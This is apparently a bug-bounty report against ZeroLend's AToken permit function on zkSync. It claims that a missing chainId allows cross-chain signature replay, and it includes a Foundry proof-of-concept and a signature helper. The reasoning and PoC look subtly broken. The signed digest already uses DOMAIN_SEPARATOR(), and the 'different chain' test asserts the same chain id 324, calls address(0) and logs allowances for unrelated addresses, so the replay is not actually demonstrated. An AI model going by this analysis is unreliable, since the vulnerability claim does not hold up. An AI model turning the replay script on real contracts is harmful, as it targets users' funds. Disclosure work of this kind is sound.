# 29342 - \[SC - Insight] Lack of chainID validation allows reuse of sign...

Submitted on Mar 14th 2024 at 13:22:04 UTC by @azhar0406 for [Boost | ZeroLend](https://immunefi.com/bounty/zerolend-boost/)

Report ID: #29342

Report type: Smart Contract

Report severity: Insight

Target: <https://explorer.zksync.io/address/0xe8178fF950Ea1B69a51cE961C542a4CC6Cb6e38E>

Impacts:

* Direct theft of any user funds, whether at-rest or in-motion, other than unclaimed yield

## Description

## Brief/Intro

The AToken.sol contract implements features aligned with EIP-2612, which extends the ERC-20 standard to include a permit function but fails to incorporate chainId in its permit validation, critical for differentiating network forks. This flaw enables permit reuse across chains (replay attacks) and forks, potentially leading to unauthorized fund access, especially if the contract is deployed at identical addresses on different networks. This elevates the risk of cross-chain exploits, undermining token security and user asset integrity.

## Vulnerability Details

<https://explorer.zksync.io/address/0xe8178fF950Ea1B69a51cE961C542a4CC6Cb6e38E#contract> \[AToken.sol] \[line number 170]

```
bytes32 public constant PERMIT_TYPEHASH =
    keccak256('Permit(address owner,address spender,uint256 value,uint256 nonce,uint256 deadline)');
...
  function permit(
    address owner,
    address spender,
    uint256 value,
    uint256 deadline,
    uint8 v,
    bytes32 r,
    bytes32 s
  ) external override {
    require(owner != address(0), Errors.ZERO_ADDRESS_NOT_VALID);
    //solium-disable-next-line
    require(block.timestamp <= deadline, Errors.INVALID_EXPIRATION);
    uint256 currentValidNonce = _nonces[owner];
    bytes32 digest = keccak256(
      abi.encodePacked(
        '\x19\x01',
        DOMAIN_SEPARATOR(),
        keccak256(abi.encode(PERMIT_TYPEHASH, owner, spender, value, currentValidNonce, deadline))
      )
    );
    require(owner == ecrecover(digest, v, r, s), Errors.INVALID_SIGNATURE);
    _nonces[owner] = currentValidNonce + 1;
    _approve(owner, spender, value);
  }

```

Atoken contract uses permit function to allows a third party to transmit a signature from a token holder that modifies the ERC20 allowance for a particular user. but in the PERMIT\_TYPEHASH nor the permit function fails to incorporate chainId in its permit validation. Therefore it can lead to a signature replay attack if the same contract deployed in different chain with the same contract address or the current chain is forked. Because this permit function can not differentiate chains.

as per the official \[EIP-2612] <https://eips.ethereum.org/EIPS/eip-2612> implementation also chainId is a must. Check Attached Image

## Impact Details

The absence of `chainId` validation can lead to direct theft of user funds across different blockchain forks, as the same approval could be exploited by malicious actors on parallel networks. Given the contract is deployed on the zkSync chain, users could lose assets if these signatures are replayed on forked versions of the chain, leading to critical financial implications.

### Attack Vector 1

Bob has AToken in his wallet on the zkSync network. He permits Alice to spend tokens using the permit function. Because the contract doesn't validate chainId, Alice replays this permit on the Ethereum network, where AToken with the same contract address exists, draining Bob's funds on Ethereum.

### Attack Vector 2

Bob again uses the permit feature for AToken on zkSync. Unaware, the same permit is exploited by Alice on a forked zkSync chain, leading to loss of Bob's tokens on both networks.

### Attack Vector 3

Bob has a wallet holding AToken. Following a contentious EIP, the community splits post-hard fork, leaving a significant user base on the original chain. On the new chain, Bob issues a permit allowing Alice to spend tokens. Alice, exploiting the absence of chainId checks, replays this permit on the old chain, thus illicitly accessing and transferring Bob’s AToken.

## References

<https://solodit.xyz/issues/lack-of-chainid-trailofbits-yield-protocol-pdf> \[Vulnerability Detail - Lack of ChainID Validation]

## Proof of Concept

```
// SPDX-License-Identifier: UNLICENSED
pragma solidity 0.8.12;

import {Test, console2} from "forge-std/Test.sol";
import {SigUtils} from "../src/SigUtils.sol";

interface IERC20 {
    function approve(address spender, uint256 amount) external returns (bool);

    function transfer(
        address recipient,
        uint256 amount
    ) external returns (bool);

    function transferFrom(
        address sender,
        address recipient,
        uint256 amount
    ) external returns (bool);

    function balanceOf(address account) external view returns (uint256);

    function allowance(
        address owner,
        address spender
    ) external view returns (uint256);

    function decimals() external view returns (uint8);
}

interface IAToken {
    function permit(
        address owner,
        address spender,
        uint256 value,
        uint256 deadline,
        uint8 v,
        bytes32 r,
        bytes32 s
    ) external;

    function nonces(address owner) external view returns (uint256);

    function DOMAIN_SEPARATOR() external view returns (bytes32);

    function UNDERLYING_ASSET_ADDRESS() external view returns (address);
}

interface CheatCodes {
    function startPrank(address) external;

    function stopPrank() external;

    function createSelectFork(
        string calldata urlOrAlias
    ) external returns (uint256);

    function createSelectFork(
        string calldata urlOrAlias,
        uint256 block
    ) external returns (uint256);
}

contract CounterTest is Test {
    IAToken public atoken;

    CheatCodes cheats = CheatCodes(0x7109709ECfa91a80626fF3989D68f67F5b1DD12D);

    address public contract_owner = 0xb76F765A785eCa438e1d95f594490088aFAF9acc;

    address public attacker = 0xf39Fd6e51aad88F6F4ce6aB8827279cffFb92266;

    SigUtils public sigUtils;

    address alice;

    address bob;

    uint256 alicePk;

    uint256 bobPk;

    uint8 v;
    bytes32 r;
    bytes32 s;

    SigUtils.Permit public permit;

    function setUp() public {
        cheats.createSelectFork("zksync");
        atoken = IAToken(0xe8178fF950Ea1B69a51cE961C542a4CC6Cb6e38E);

        sigUtils = new SigUtils(
            0xb585f7e5de0161dc806933223b70a0ecdade9f73a493bb1110fe89ab2681f032
        );


        (alice, alicePk) = makeAddrAndKey("alice");
        // emit log_address(alice);
        bytes32 hash = keccak256("Signed by Alice");
        (uint8 v0, bytes32 r0, bytes32 s0) = vm.sign(alicePk, hash);
        address signer = ecrecover(hash, v0, r0, s0);
        assertEq(alice, signer);

        (bob, bobPk) = makeAddrAndKey("bob");
        // emit log_address(bob);
        bytes32 hash1 = keccak256("Signed by Bob");
        (uint8 v1, bytes32 r1, bytes32 s1) = vm.sign(bobPk, hash1);
        address signer1 = ecrecover(hash1, v1, r1, s1);
        assertEq(bob, signer1);

        permit = SigUtils.Permit({
            owner: address(alice),
            spender: address(bob),
            value: 1e18,
            nonce: 0,
            deadline: 1 days
        });

        bytes32 digest = sigUtils.getTypedDataHash(permit);

        (v, r, s) = vm.sign(alicePk, digest);
    }

    function test_1_Noraml_Atoken_Permit_On_zkSync() public {

        assertNotEq(address(atoken).code.length, 0);

        console2.log(address(atoken).code.length);

         bytes memory data = abi.encodeWithSignature("nonces(address)", permit.owner);

        // console2.logAddress(atoken.UNDERLYING_ASSET_ADDRESS());

         (bool status,bytes memory check) = address(0).call(data);

        console2.logBytes(check);
        console2.logBool(status);

        // assertEq(success,0);

        cheats.startPrank(alice);

        assertNotEq(address(atoken).code.length, 0);

        

        atoken.permit(
            permit.owner,
            permit.spender,
            permit.value,
            permit.deadline,
            v,
            r,
            s
        );

      
        console2.log("Allowance: ", IERC20(address(atoken)).allowance(address(0x328809Bc894f92807417D2dAD6b7C998c1aFdac6), address(0x1D96F2f6BeF1202E4Ce1Ff6Dad0c2CB002861d3e)));

        cheats.stopPrank();
    }

    function test_2_Atoken_deployed_with_same_contract_address_on_different_chain_or_Zksync_Chain_forked()
        public
    {
        cheats.createSelectFork("anvil");

        cheats.startPrank(attacker);

        atoken.permit(
            permit.owner,
            permit.spender,
            permit.value,
            permit.deadline,
            v,
            r,
            s
        );


        assertEq(block.chainid, 324);
        console2.log("Allowance: ", IERC20(address(atoken)).allowance(address(0x328809Bc894f92807417D2dAD6b7C998c1aFdac6), address(0x1D96F2f6BeF1202E4Ce1Ff6Dad0c2CB002861d3e)));
        console2.log("Singature Replayed Successfully on different chain");

        cheats.stopPrank();
    }
}

```

#### SigUtils.sol

```
// SPDX-License-Identifier: MIT
pragma solidity 0.8.12;

contract SigUtils {
    bytes32 internal DOMAIN_SEPARATOR;

    constructor(bytes32 _DOMAIN_SEPARATOR) {
        DOMAIN_SEPARATOR = _DOMAIN_SEPARATOR;
    }

    // keccak256("Permit(address owner,address spender,uint256 value,uint256 nonce,uint256 deadline)");
    bytes32 public constant PERMIT_TYPEHASH =
        0x6e71edae12b1b97f4d1f60370fef10105fa2faae0126114a169c64845d6126c9;

    struct Permit {
        address owner;
        address spender;
        uint256 value;
        uint256 nonce;
        uint256 deadline;
    }

    // computes the hash of a permit
    function getStructHash(Permit memory _permit)
        internal
        pure
        returns (bytes32)
    {
        return
            keccak256(
                abi.encode(
                    PERMIT_TYPEHASH,
                    _permit.owner,
                    _permit.spender,
                    _permit.value,
                    _permit.nonce,
                    _permit.deadline
                )
            );
    }

    // computes the hash of the fully encoded EIP-712 message for the domain, which can be used to recover the signer
    function getTypedDataHash(Permit memory _permit)
        public
        view
        returns (bytes32)
    {
        return
            keccak256(
                abi.encodePacked(
                    "\x19\x01",
                    DOMAIN_SEPARATOR,
                    getStructHash(_permit)
                )
            );
    }
}

```
